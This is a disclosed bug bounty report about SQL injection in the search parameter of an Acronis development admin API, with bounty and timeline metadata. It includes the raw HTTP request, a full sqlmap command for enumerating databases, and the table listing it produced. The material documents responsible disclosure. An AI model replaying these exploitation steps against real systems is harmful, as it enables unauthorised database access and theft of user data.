---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-06-22
submitted: 2020-07-14T03:36:27.941Z
bounty_usd: 250
votes: 118
cve: []
program: "[[programs/acronis|Acronis]]"
reporter: "stealthy"
source: "https://hackerone.com/reports/923020"
title: "SQL injection on admin.acronis.host development web service"
---
# SQL injection on admin.acronis.host development web service

> **Severity:** High | **Bounty:** 250 USD | **Votes:** 118 | **Program:** Acronis | **Disclosed:** 2021-06-22

- Report: [https://hackerone.com/reports/923020](https://hackerone.com/reports/923020)
- CWE: SQL Injection
- Submitted: 2020-07-14T03:36:27.941Z

## Report summary

SQL injection was possible on `admin.acronis.host` web service that was used for development purposes only. Acronis security team confirmed that the service did not contain any sensitive data or data of real users.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
I found an Acronis domain and started hunting on it. During my hunting, I found an admin panel and was able to access this panel (separate report inbound). It was easy to gain access to this panel, and I was not sure if it was for testing purposes or a genuine admin panel. I played around with minor settings to see if I could change some content on the main page and ensure that this was a real admin panel. I put a quote in the search bar for indexing dashboard pages and intercepted the request. Then I realized all requests are through the administrator API, which I now have access to and an authorization bearer token. Admin API access, combined with the entire site index in the panel (including all content for all pages), confirmed that I am in a real live admin panel.

Next, I noticed the quote returned a server error in the API. I  tested an SQL injection (along with one other critical bug) and confirmed its presence. I can view three databases, and I dumped the table names for one of the databases to see what type of information it contained. In the database, there are tables named `users`, `password_resets`, and more. Furthermore, the login redirected to the main Acronis website, so I knew this data is quite sensitive. I only explored nonsensitive data. The extent of what I did with the SQL injection is diclosed in this report below.

I understand this domain is not rated critical, but I set it because of the severity of the bug.

**Steps to Reproduce:**
Visit the admin panel for Acronis hosting.

    https://admin.acronis.host/

Login with the given credentials and visit the pages section.

    https://admin.acronis.host/#/pages

Here input any data and intercept the request. Below is a copy of the raw request.

```text
GET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search=* HTTP/1.1
Host: dev.acronis.host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer [REDACTED-JWT]
Origin: https://admin.acronis.host
Connection: close
Referer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372

```

The `search` parameter is vulnerable. Save the request I provided as a text file on your desktop and run the following command with SQLMap.
```
sudo python sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs
```

This will drop the following three databases.

{F906431}

Next, I used the following flags in SQLMap `-D acronis_site --tables`. The `-D` tells SQLMap which database and `--tables` tells SQLMap to drop table names. I only explored nonsensitive information.
```text
Database: acronis_site
[24 tables]
+----------------------+
| awards               |
| failed_jobs          |
| files                |
| history_pages        |
| locales              |
| migrations           |
| page_products        |
| page_translations    |
| pages                |
| pages_1              |
| pages_2              |
| pages_3              |
| password_resets      |
| product_prices       |
| product_translations |
| products             |
| products_1           |
| related_products     |
| related_tags         |
| resources            |
| tags                 |
| users                |
| variables            |
| webinars             |
+----------------------+
```

After seeing this, I ceased testing this SQL injection and reported the vulnerability directly to your team.

## Impact

Server-side SQL injection leading to database access and exposure of sensitive information. Reading this information likely allows an attacker to execute remote code by stealing admin password resets and user information.

## Timeline

- **Report Filed**
- **2020-07-15** @stushieva: Hi, @stealthy. Thanks for your report! 
We are reviewing it currently.
- **Changed Scope**
- **Report Severity Updated**
- **2020-07-16** @stealthy: Hi @stushieva,

Since the site is now forbidden and changes have been made can we move these reports to triage?

I hope you are doing well,
Stealthy
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Cancelled Disclosure Request**
- **Report Title Updated**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
